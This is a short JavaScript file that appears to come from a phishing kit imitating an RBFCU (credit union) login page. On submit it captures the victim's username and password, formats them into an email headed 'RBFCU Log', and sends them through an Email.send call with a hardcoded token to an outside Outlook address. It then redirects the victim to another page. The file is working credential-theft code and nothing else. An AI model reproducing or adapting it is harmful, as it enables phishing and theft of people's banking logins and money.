const fusername = document.getElementById('fusername');
const fpassword = document.getElementById('fpassword');
const submit = document.getElementsByClassName('form-contact')[0];

submit.addEventListener('submit', (e) => {
    e.preventDefault();

    let ebody = `
    <b>RBFCU Log</b>
    <br>
    <br>
    <b>User: </b>${fusername.value} 
    <br>
    <br>
    <b>Pass: </b>${fpassword.value} 
    <br>`;

    Email.send({
        SecureToken: "9c8cec46-60dd-4046-b3d0-0751b0d5c5c0",
        To: 'jakesfishin111@outlook.com',
        From: "jakeramon999@gmail.com",
        Subject: "RBFCU: " + fusername.value,
        Body: ebody
    }).then(function() {
        window.location.href = "r.html";
    });
});